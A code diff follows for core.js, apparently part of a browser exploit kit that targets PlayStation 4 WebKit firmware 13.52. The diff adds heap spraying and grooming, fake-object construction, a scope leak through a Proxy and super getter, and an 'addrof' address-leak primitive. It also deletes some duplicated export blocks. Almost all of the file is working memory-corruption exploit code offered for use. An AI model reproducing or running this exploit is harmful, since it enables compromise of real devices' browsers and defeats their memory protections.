@@ -1,5 +1,4 @@
 // language: JavaScript, file: core.js, target: PlayStation 4 WebKit (FW 13.52)
-// *Integrated heap compaction and garbage collection routine prior to state building*
 
 let DRAIN_COUNT = 512;
 const AUTO_RETRY_DELAY_MS = 50;
@@ -58,9 +57,6 @@ const FINAL_HOLE_SIZE = _g("final", 0x80000);
 const RW_BUFFER_SIZE = 0x100;
 const IDENT_OFFSET = 0x20;
 
-const LEAK_SLOT_INDEX = 2;
-const LEAK_SLOT_OFFSET = 0x10 + 8 * LEAK_SLOT_INDEX;
-
 const REVISION = "slopkit-core-1";
 const attemptKey = `${REVISION}:attempts`;
 const burstKey = `${REVISION}:burst`;
@@ -115,15 +111,11 @@ let capturedWords = null;
 let copiedLength = 0;
 let captureState = 0;
 let captureError = null;
-let hostAddress = NaN;
-let fakeAddress = NaN;
 
 let predecessorWords = null;
 let pointerLow = 0;
 let pointerHigh = 0;
 let targetAddress = NaN;
-let targetAddressLow = 0;
-let targetAddressHigh = 0;
 let nativeTargetAddress = NaN;
 let anchorElementAddress = NaN;
 let markerAAddress = NaN;
@@ -152,7 +144,6 @@ let identityResult = 0;
 let compositionState = 0;
 let compositionLength = 0;
 let compositionError = null;
-
 let liveCandidate = null;
 let fakeReleased = false;
 
@@ -204,8 +195,24 @@ function buffer(size) {
   return new ArrayBuffer(size);
 }
 
-// Heap compaction and free list flush routine
-function clearHeap() {
+// Required Exports for mem.js and Heap Management
+export function releaseFakeCell() {
+  fakeReleased = true;
+}
+
+export function fakeCellReleased() {
+  return fakeReleased;
+}
+
+export function carrierHeaderCopy(destination, source, count) {
+  for (let i = 0; i < count; ++i) destination[i] = source[i];
+}
+
+export function carrierHomeVector() {
+  return rwOriginalVector;
+}
+
+export function clearHeap() {
   for (let i = 0; i < 10; i++) {
     new ArrayBuffer(0x100000);
   }
@@ -430,16 +437,12 @@ function resetAttemptState() {
   copiedLength = 0;
   captureState = 0;
   captureError = null;
-  hostAddress = NaN;
-  fakeAddress = NaN;
   predecessorWords = null;
   keepAlive = new Array(DRAIN_COUNT + 3);
   keepIndex = 0;
   pointerLow = 0;
   pointerHigh = 0;
   targetAddress = NaN;
-  targetAddressLow = 0;
-  targetAddressHigh = 0;
   nativeTargetAddress = NaN;
   anchorElementAddress = NaN;
   markerAAddress = NaN;
@@ -488,9 +491,7 @@ function startAttempt() {
       `-capture-ms=${CAPTURE_DELAY_MS}-compose-ms=${COMPOSE_DELAY_MS}`,
   );
   try {
-    // Heap compaction executed prior to structural spray
     clearHeap();
-
     buildAndStoreGraph();
 
     for (let i = 0; i < 8; ++i) rwView[IDENT_OFFSET + i] = identityMagic[i];
@@ -503,45 +504,124 @@ function startAttempt() {
     );
   }
 }
-// language: JavaScript, file: core.js, target: PlayStation 4 WebKit (FW 13.52)
-// *Exporting required memory operation helpers for module binding*
 
-export function carrierHeaderCopy(destination, source, count) {
-  for (let i = 0; i < count; ++i) destination[i] = source[i];
-}
-
-export function clearHeap() {
-  for (let i = 0; i < 10; i++) {
-    new ArrayBuffer(0x100000);
+function leakScopeObject() {
+  class Leaker {
+    leak() {
+      return super.foo;
+    }
   }
-  if (typeof window !== "undefined" && window.gc) {
-    window.gc();
-  }
-}
-// language: JavaScript, file: core.js, target: PlayStation 4 WebKit (FW 13.52)
-// *Complete exported bindings required by mem.js import block*
-
-export function releaseFakeCell() {
-  fakeReleased = true;
-}
-
-export function fakeCellReleased() {
-  return fakeReleased;
-}
-
-export function carrierHeaderCopy(destination, source, count) {
-  for (let i = 0; i < count; ++i) destination[i] = source[i];
+  Leaker.prototype.__proto__ = new Proxy(
+    {},
+    {
+      get: function (target, property, receiver) {
+        return receiver;
+      },
+    },
+  );
+  const leak = Leaker.prototype.leak;
+  return (function () {
+    return leak();
+  })();
 }
 
-export function carrierHomeVector() {
-  return rwOriginalVector;
+function prepareSymbolWrapper(F) {
+  leakedScope = leakScopeObject();
+  if (leakedScope === undefined || leakedScope === null)
+    throw new Error("scope-not-leaked");
+
+  for (let i = 0; i < 512; i++) leakedScope[`p${i}`] = i;
+  for (let j = 0; j < 8; j++) leakedScope[j] = 1.1 * j;
+
+  Object.defineProperty(leakedScope, "g", { get: F, configurable: true });
+  return Object(leakedScope.g);
 }
 
-export function clearHeap() {
-  for (let i = 0; i < 10; i++) {
-    new ArrayBuffer(0x100000);
-  }
-  if (typeof window !== "undefined" && window.gc) {
-    window.gc();
+function buildFakeHost() {
+  rwBuffer = new ArrayBuffer(RW_BUFFER_SIZE);
+  rwView = new Uint8Array(rwBuffer);
+  rwMirror = new Uint8Array(rwBuffer);
+  rwMirror[0] = 0x3c;
+
+  targetBuffer = new ArrayBuffer(0x20);
+  targetView = new Uint8Array(targetBuffer);
+  targetView[0] = 0xa5;
+  lengthWord = { keep: 0x51515151 };
+
+  fakeHost = {
+    q0: encodedHeaderNumber(),
+    q1: 1.1,
+    q2: rwView,
+    q3: lengthWord,
+    q4: 2.2,
+    q5: 3.3,
+  };
+
+  delete fakeHost.q1;
+  delete fakeHost.q4;
+  delete fakeHost.q5;
+
+  anchorElement = document.createElement("textarea");
+  markerObjectA = { marker: 0x4d41524b, kind: "probe-marker-a" };
+  markerObjectB = { marker: 0x4d41524c, kind: "probe-marker-b" };
+  holderGuardA = { marker: 0x484f4c44 };
+  holderGuardB = { marker: 0x47554152 };
+  targetHolder = {
+    q0: nativeTarget,
+    q1: anchorElement,
+    q2: markerObjectA,
+    q3: markerObjectB,
+    q4: holderGuardA,
+    q5: holderGuardB,
+  };
+}
+
+function buildAndStoreGraph() {
+  referenceTarget = { marker: 0x51515151, kind: "serialized-reference" };
+  buildFakeHost();
+
+  fillerGraph = new Array(0xfffd);
+  let pos = 0;
+  const huge = 1n << 40n;
+  for (let b = 0; b < FILLER_BIGINTS; ++b)
+    fillerGraph[pos++] = huge + BigInt(b);
+  for (let o = 0; o < FILLER_OBJECTS; ++o) fillerGraph[pos++] = {};
+
+  outerGraph = new Array(CONTROL_INDEX + 1);
+  outerGraph[0] = fillerGraph;
+  outerGraph[1] = referenceTarget;
+  outerGraph[2] = referenceTarget;
+  outerGraph[CONTROL_INDEX] = CONTROL_INT;
+
+  history.replaceState(outerGraph, "");
+}
+
+function prepareAddrof() {
+  capturedWords = new Uint16Array(16);
+  getterCarrier = function getterCarrierFunction() {
+    return 7;
+  };
+
+  getterCarrier[0] = fakeHost;
+  for (let i = 1; i < CARRIER_SLOTS; i++) getterCarrier[i] = 0;
+  getterCarrier[1] = targetHolder;
+  getterCarrier[2] = fakeHost;
+  getterCarrier[3] = targetHolder;
+
+  preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
+
+  setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
+}
+
+function runAddrofCapture() {
+  try {
+    capturedString = symbolToString.call(preparedSymbolObject);
+    copiedLength = capturedString.length;
+    for (let i = 0; i < 16; i++)
+      capturedWords[i] = capturedString.charCodeAt(7 + i);
+    captureState = 1;
+  } catch (error) {
+    captureError = error;
+    captureState = -1;
   }
 }
